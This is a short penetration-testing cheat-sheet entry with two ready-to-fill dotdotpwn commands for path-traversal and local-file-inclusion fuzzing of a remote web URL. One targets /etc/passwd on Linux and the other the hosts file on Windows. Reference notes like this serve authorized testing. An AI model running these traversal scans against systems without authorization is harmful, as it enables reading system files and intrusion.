# dotdotpwn

% lfi, local file inclusion

#plateform/linux #target/remote #cat/RECON


## dotdotpwn - recon linux
```
dotdotpwn -m http-url  -u http://<url>=TRAVERSAL -M GET -k <pattern|root> -f <file|/etc/passwd>  -d <depth|5> -b -q
```

## dotdotpwn - recon windows
```
dotdotpwn -m http-url  -u http://<url>=TRAVERSAL -M GET -k <pattern|localhost> -f <file|/windows/system32/drivers/etc/hosts>  -d <depth|5> -b -q
```

